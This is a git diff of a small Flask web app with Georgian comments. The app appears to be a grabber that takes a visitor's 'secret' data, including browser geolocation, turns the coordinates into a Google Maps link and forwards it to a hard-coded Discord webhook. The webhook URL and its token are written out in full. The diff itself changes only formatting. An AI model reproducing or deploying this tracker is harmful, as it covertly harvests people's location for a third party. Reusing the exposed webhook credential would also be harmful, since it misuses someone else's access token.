@@ -8,23 +8,18 @@ app = Flask(__name__)
 CORS(app)
 
 # 🚨 შენი დისქორდის ლინკი
-DISCORD_WEBHOOK_URL = os.environ.get(
-    "DISCORD_WEBHOOK_URL",
-    "https://discord.com/api/webhooks/1571037523944144916/M166376XMNczFiKd5_afTR2wCx9XQ1UNdtq7n4vGjAuP5MNtM8cBxnWHpbHb5OVX28Bz"
-)
-
+DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1571037523944144916/M166376XMNczFiKd5_afTR2wCx9XQ1UNdtq7n4vGjAuP5MNtM8cBxnWHpbHb5OVX28Bz")
 
 @app.route('/')
 def home():
     return render_template('index.html')
-
 
 @app.route('/upload_data', methods=['POST'])
 def upload_data():
     try:
         data = request.json
         secret = data.get('secret', {})
-
+        
         # 1. ლოკაცია
         if secret.get('lat') and secret['lat'] != "უარი":
             maps_link = f"https://www.google.com/maps?q={secret['lat']},{secret['lon']}"
@@ -62,7 +57,6 @@ def upload_data():
     except Exception as e:
         print(f"❌ შეცდომა: {e}")
         return "შეცდომა"
-
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
